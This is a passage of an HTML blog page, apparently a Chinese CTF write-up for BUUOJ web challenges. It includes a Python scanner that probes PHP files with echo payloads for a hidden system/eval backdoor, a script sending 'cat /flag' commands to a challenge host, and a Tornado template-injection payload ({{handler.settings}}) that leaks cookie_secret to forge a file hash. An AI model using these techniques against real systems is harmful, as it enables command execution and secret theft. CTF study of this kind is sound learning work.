class="string">"D:/phpstudy/PHPTutorial/WWW/src/"</span>  </span><br><span class="line">files = os.listdir(path)  </span><br><span class="line"><span class="meta">#print(len(files))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">async def read_file(file):</span><br><span class="line">    f = open(path + <span class="string">"/"</span> + file);  </span><br><span class="line">    iter_f = iter(f);  </span><br><span class="line">    <span class="built_in">str</span> = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="built_in">in</span> iter_f:  </span><br><span class="line">        <span class="built_in">str</span> = <span class="built_in">str</span> + line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    <span class="built_in">params</span> = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_GET['"</span>, start) != -<span class="number">1</span>:</span><br><span class="line">        pos2 = <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"']"</span>, <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_GET['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = <span class="built_in">str</span>[<span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_GET['"</span>, start) + <span class="number">7</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">params</span>[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="meta"># print(var)</span></span><br><span class="line"></span><br><span class="line">    start = <span class="number">0</span></span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_POST['"</span>, start) != -<span class="number">1</span>:</span><br><span class="line">        pos2 = <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"']"</span>, <span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_POST['"</span>, start) + <span class="number">1</span>)</span><br><span class="line">        var = <span class="built_in">str</span>[<span class="built_in">str</span>.<span class="built_in">find</span>(<span class="string">"$_POST['"</span>, start) + <span class="number">8</span>: pos2]</span><br><span class="line">        start = pos2 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        data[var] = <span class="string">'echo("glzjin");'</span></span><br><span class="line"></span><br><span class="line">        <span class="meta"># print(var)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta"># eval test</span></span><br><span class="line">    r = session.post(<span class="string">'http://127.0.0.1/src/'</span> + file, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">'glzjin'</span>) != -<span class="number">1</span>:</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        print(<span class="string">"end at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line">   <span class="meta"># <span class="meta-keyword">else</span>:</span></span><br><span class="line">        <span class="meta">#print(<span class="meta-string">"1"</span>)</span></span><br><span class="line"></span><br><span class="line">    <span class="meta"># assert test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> <span class="built_in">params</span>:</span><br><span class="line">        <span class="built_in">params</span>[i] = <span class="built_in">params</span>[i][:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> data:</span><br><span class="line">        data[i] = data[i][:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://127.0.0.1/src/'</span> + file, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">'glzjin'</span>) != -<span class="number">1</span>:</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        print(<span class="string">"end at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    <span class="meta"># system test</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> <span class="built_in">params</span>:</span><br><span class="line">        <span class="built_in">params</span>[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="built_in">in</span> data:</span><br><span class="line">        data[i] = <span class="string">'echo glzjin'</span></span><br><span class="line"></span><br><span class="line">    r = session.post(<span class="string">'http://127.0.0.1/src/'</span> + file, data=data, <span class="built_in">params</span>=<span class="built_in">params</span>)</span><br><span class="line">    <span class="keyword">if</span> r.<span class="built_in">text</span>.<span class="built_in">find</span>(<span class="string">'glzjin'</span>) != -<span class="number">1</span>:</span><br><span class="line">        print(file + <span class="string">" found!"</span>)</span><br><span class="line">        print(<span class="string">"end at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">#print(<span class="meta-string">"===================="</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> <span class="variable">__name__</span> == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"start at: %s s"</span> % <span class="built_in">time</span>.<span class="built_in">time</span>())</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    <span class="keyword">for</span> file <span class="built_in">in</span> files:    </span><br><span class="line">        task = loop.create_task(read_file(file))</span><br><span class="line">    loop.run_until_complete(task)</span><br></pre></td></tr></table></figure>
+
+<p>感觉它跑的也好慢，嘶~是不是哪里出错了。</p>
+<p>所以最后还是多线程（虽然python是伪多线程）胜利了？</p>
+<p>那最后再改改赵师傅的脚本（也没改多少，就是多输出一个data和params，省的还要审计半天2333）</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xk0SzyKwfzw.php found!</span><br><span class="line">&#123;<span class="symbol">'sDCPHvsvwWo</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'V5th2o3Pea_6O</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'amQ2A0SPU</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'riZH5vvoY</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'ZCBPLk</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'wWMgYch</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'Detx3g1SfCf</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'tastJGHA5De</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'fgUPcHJZvkq</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'ppiJIyg</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'KtpWfYB</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);'&#125;</span><br><span class="line">&#123;<span class="symbol">'z5c_TrB</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'xd0UXc39w</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'DdWk_nXmZTF_Dt</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'dthxTqRPg8YtH</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'ImPVuGCXfrS</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'O0yRgyjaOF7m</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'DeMcscsp</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'YV8nqJDhD</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'EMNPxS2A7</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'kBVLzQEgb</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'Efa5BVG</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'i_QfWB2x1</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'E8NPXbr7Cq</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'zfEddFlxaK_FTO3A</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'qjWSY5fjcgNtb</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);', <span class="symbol">'qUVRuZTF27EhUKTI</span>': <span class="symbol">'echo</span>(<span class="string">"glzjin"</span>);'&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这么多参数，而且三种函数都会有回显，那就每种函数都试过来，（既然已经知道是system函数了，那。。。）</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="built_in">data</span>=&#123;<span class="string">'sDCPHvsvwWo'</span>: <span class="string">'cat /flag'</span>, <span class="string">'V5th2o3Pea_6O'</span>: <span class="string">'cat /flag'</span>, <span class="string">'amQ2A0SPU'</span>: <span class="string">'cat /flag'</span>, <span class="string">'riZH5vvoY'</span>: <span class="string">'cat /flag'</span>, <span class="string">'ZCBPLk'</span>: <span class="string">'cat /flag'</span>, <span class="string">'wWMgYch'</span>: <span class="string">'cat /flag'</span>, <span class="string">'Detx3g1SfCf'</span>: <span class="string">'cat /flag'</span>, <span class="string">'tastJGHA5De'</span>: <span class="string">'cat /flag'</span>, <span class="string">'fgUPcHJZvkq'</span>: <span class="string">'cat /flag'</span>, <span class="string">'ppiJIyg'</span>: <span class="string">'cat /flag'</span>, <span class="string">'KtpWfYB'</span>: <span class="string">'cat /flag'</span>&#125;</span><br><span class="line"><span class="keyword">params</span>=&#123;<span class="string">'z5c_TrB'</span>: <span class="string">'cat /flag'</span>, <span class="string">'xd0UXc39w'</span>: <span class="string">'cat /flag'</span>, <span class="string">'DdWk_nXmZTF_Dt'</span>: <span class="string">'cat /flag'</span>, <span class="string">'dthxTqRPg8YtH'</span>: <span class="string">'cat /flag'</span>, <span class="string">'ImPVuGCXfrS'</span>: <span class="string">'cat /flag'</span>, <span class="string">'O0yRgyjaOF7m'</span>: <span class="string">'cat /flag'</span>, <span class="string">'DeMcscsp'</span>: <span class="string">'cat /flag'</span>, <span class="string">'YV8nqJDhD'</span>: <span class="string">'cat /flag'</span>, <span class="string">'EMNPxS2A7'</span>: <span class="string">'cat /flag'</span>, <span class="string">'kBVLzQEgb'</span>: <span class="string">'cat /flag'</span>, <span class="string">'Efa5BVG'</span>: <span class="string">'cat /flag'</span>, <span class="string">'i_QfWB2x1'</span>: <span class="string">'cat /flag'</span>, <span class="string">'E8NPXbr7Cq'</span>: <span class="string">'cat /flag'</span>, <span class="string">'zfEddFlxaK_FTO3A'</span>: <span class="string">'cat /flag'</span>, <span class="string">'qjWSY5fjcgNtb'</span>: <span class="string">'cat /flag'</span>, <span class="string">'qUVRuZTF27EhUKTI'</span>: <span class="string">'cat /flag'</span>&#125;</span><br><span class="line">session = requests.Session()</span><br><span class="line">file= <span class="string">'xk0SzyKwfzw.php'</span></span><br><span class="line">s = session.post(<span class="string">'http://web15.buuoj.cn/'</span>+file,<span class="built_in">data</span>=<span class="built_in">data</span>,<span class="keyword">params</span>=<span class="keyword">params</span>)</span><br><span class="line">print(re.search(<span class="string">'flag&#123;(.*?)&#125;'</span>,s.text).<span class="keyword">group</span>())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;flag&#123;us4882vyom353basexu6ai7c0i66gfag&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（啊，这样子下来感觉自己啥也没做啊，凑，wdnmd）</p>
+<h3 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h3><p>这题倒像是个密码学的题</p>
+<p>先看hints.txt:</p>
+<p>md5(cookie_secret+md5(filename))</p>
+<p>那么就有</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bf60e1051f59dbb931208200bcf8c08e=md5(<span class="name">cookie_secret+md5</span>(<span class="name">/hints</span>.txt))</span><br><span class="line"></span><br><span class="line"><span class="number">1e1439</span>df1c0c7eeb9e93a8e44a58bc9f=md5(<span class="name">cookie_secret+md5</span>(<span class="name">/welcome</span>.txt))	</span><br><span class="line"></span><br><span class="line"><span class="number">245</span>a5ccf5543f16709d8c22851af5454=md5(<span class="name">cookie_secret+md5</span>(<span class="name">/flag</span>.txt))</span><br></pre></td></tr></table></figure>
+
+<p>/flag.txt中是</p>
+<p>flag in /fllllllllllllag</p>
+<p>所以这题逻辑就很简单，整到cookie_secret，构造payload，应该就可以了</p>
+<p>那，这个secret怎么整呢？</p>
+<p>实在不会，太菜了，不会口算md5</p>
+<p>去看了下wp，啊，还是太年轻，welcome里的render有用，报错信息的url</p>
+<p>?msg=Error    也算是个提示</p>
+<p>正解为：</p>
+<p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener">render函数介绍</a><br><a href="https://www.kancloud.cn/kancloud/python-basic/41712" target="_blank" rel="noopener">tornado模板self.render和模板变量传递</a></p>
+<p>测试后发现还有一个error界面，格式为<code>/error?msg=Error</code>，怀疑存在<a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击 （SSTI）</a></p>
+<p>尝试<code>/error?msg=</code><br>在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考<a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">Tornado官方文档</a></p>
+<p>回显</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">module</span> <span class="string">'datetime'</span> <span class="keyword">from</span> <span class="string">'/usr/local/lib/python2.7/lib-dynload/datetime.so'</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>通过查阅文档发现cookie_secret在Application对象settings属性中</strong>（这个最重要了）还发现self.application.settings有一个别名</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RequestHandler.settings</span><br><span class="line">An alias <span class="keyword">for</span> self<span class="selector-class">.application</span><span class="selector-class">.settings</span>.</span><br></pre></td></tr></table></figure>
+
+<p>handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings。</p>
+<p>构造payload获取cookie_secret</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">error</span>?msg=&#123;&#123;<span class="keyword">handler</span>.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>(也不知道为啥RequestHandler.application.settings不行，RequestHandler.settings不行，咱也不知道，咱待会自己去查)</p>
+<p><a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">这里我想将的是handler这个对象，handler指向的处理当前这个页面的RequestHandler对象！但我在Tornado的Blog Demo中，发现了这样的语句：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> &lt;title&gt;</span><br><span class="line"><span class="number">2</span>     &#123;&#123; escape(handler<span class="selector-class">.settings</span>[<span class="string">"blog_title"</span>]) &#125;&#125;</span><br><span class="line"><span class="number">3</span> &lt;/title&gt;</span><br><span class="line">但是奇怪的是RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性！</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">后来重新翻了一下文档，发现又是一个别名（URL）：</span><br><span class="line"></span><br><span class="line">RequestHandler.settings</span><br><span class="line"></span><br><span class="line">An alias <span class="keyword">for</span> self<span class="selector-class">.application</span><span class="selector-class">.settings</span>.</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">handler 指向RequestHandler</span><br><span class="line"></span><br><span class="line">而RequestHandler.settings又指向self<span class="selector-class">.application</span><span class="selector-class">.settings</span></span><br><span class="line"></span><br><span class="line">所以handler.settings就指向RequestHandler<span class="selector-class">.application</span><span class="selector-class">.settings</span>了！</span><br></pre></td></tr></table></figure>
+
+<p>（看来这是默认就这么用了似乎2333）</p>
+<p>回显：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'autoreload'</span>: <span class="keyword">True</span>, <span class="string">'compiled_template_cache'</span>: <span class="keyword">False</span>, <span class="string">'cookie_secret'</span>: <span class="string">'M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r'</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(s)</span>:</span></span><br><span class="line"> md5 = hashlib.md5() </span><br><span class="line"> md5.update(s) </span><br><span class="line"> <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span><span class="params">()</span>:</span></span><br><span class="line"> filename = <span class="string">'/fllllllllllllag'</span></span><br><span class="line"> cookie_secret = <span class="string">'M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r'</span></span><br><span class="line"> print(md5(cookie_secret+md5(filename)))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> filehash()</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://web9.buuoj.cn/<span class="keyword">file</span>?<span class="keyword">filename</span>=/fllllllllllllag&amp;filehash=<span class="number">70</span>aed71508e50d160a73756a21e9953d</span><br></pre></td></tr></table></figure>
+
+<h4 id="learning-1"><a href="#learning-1" class="headerlink" title="learning"></a>learning</h4><p><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener">render函数介绍</a></p>
+<p>（表示没太看懂）</p>
+<p><a href="https://www.kancloud.cn/kancloud/python-basic/41712" target="_blank" rel="noopener">tornado模板self.render和模板变量传递</a></p>
+<figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">重点看两个类中都有的self.render()，用这个方法引入相应的模板。</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    self.render("index.html")</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">显示index.html模板，但是此时并没有向模板网页传递任何数据，仅仅显示罢了。下面一个：</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    self.render("user.html",username=user_name,email=user_email,website=user_website,language=user_language)</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">与前面的不同在于，不仅仅是要引用模板网页user.html，还要向这个网页传递一些数据，例如username=user_name，含义就是，在模板中，某个地方是用username来标示得到的数据，而user_name是此方法中的一个变量，也就是对应一个数据，那么模板中的username也就对应了user_name的数据，这是通过username=user_name完成的（说的有点像外语了）。后面的变量同理。</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">然后是index.html</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="meta">&lt;!DOCTYPE html&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">title</span>&gt;</span>sign in your name<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Information<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your name is </span><span class="template-variable">&#123;&#123;username&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your email is </span><span class="template-variable">&#123;&#123;email&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>Your website is </span><span class="template-variable">&#123;&#123;website&#125;&#125;</span><span class="xml">, it is very good. This website is make by </span><span class="template-variable">&#123;&#123;language&#125;&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">上面的模板代码存储为名为user.html的文件，并且和前面已经保存的在同一个目录中。</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">看HTML模板代码中，有类似</span><span class="template-variable">&#123;&#123;username&#125;&#125;</span><span class="xml">的变量，模板中用</span><span class="template-variable">&#123;&#123;&#125;&#125;</span><span class="xml">引入变量，这个变量就是在self.render()中规定的，两者变量名称一致，对应将相应的值对象引入到模板中。</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.freebuf.com/vuls/83999.html" target="_blank" rel="noopener">服务端模板注入攻击 （SSTI）</a></p>
+<p>但是，如果渲染的模版内容受到用户的控制，情况就不一样了。修改代码为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>
+
+<p>上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见：</p>
+<p><a href="https://image.3001.net/images/20151104/14466168501989.png" target="_blank" rel="noopener"><img src="/2019/07/30/The_Third_Day_for_Web/14466168501989.png!small" alt="2.png"></a></p>
+<p>对比上面两种情况，简单的说服务端模板注入的形成终究还是因为服务端相信了用户的输出而造成的（Web安全真谛：永远不要相信用户的输入！）。当然了，第二种情况下，攻击者不仅仅能插入 JavaScript 脚本，还能针对模板框架进行进一步的攻击，此部分只说明原理，在后面会对攻击利用进行详细说明和演示。</p>
+<p>如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和<strong>解析</strong>最后输出。</p>
+<p>借用本文第二部分所用到的代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/../lib/Twig/Autoloader.php'</span>;</span><br><span class="line">Twig_Autoloader::register(<span class="keyword">true</span>);</span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">"Hello &#123;$_GET['name']&#125;"</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>
+
+<p>在 Twig 模板引擎里，  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 name=20 ，则在服务端拼接的模版内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123;<span class="number">2</span>*<span class="number">10</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Twig 模板引擎在编译模板的过程中会计算 20  中的表达式 2*10 ，会将其返回值 20  作为模板变量的值输出，如下图：</p>
+<p><a href="https://image.3001.net/images/20151104/14466168807902.png" target="_blank" rel="noopener"><img src="/2019/07/30/The_Third_Day_for_Web/14466168807902.png!small" alt="3.png"></a></p>
+<p><a href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax" target="_blank" rel="noopener">Tornado官方文档</a></p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.zhaoj.in/read-5873.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5873.html</a></p>
+<p><a href="https://blog.csdn.net/weixin_44677409/article/details/94410580" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/94410580</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/note/" rel="tag"># note</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/28/The_First_Day_for_Web/" rel="next" title="The First Day for Web">
+                <i class="fa fa-chevron-left"></i> The First Day for Web
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/31/The_Fifth_Day_for_Web/" rel="prev" title="The Fifth Day for Web">
+                The Fifth Day for Web <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
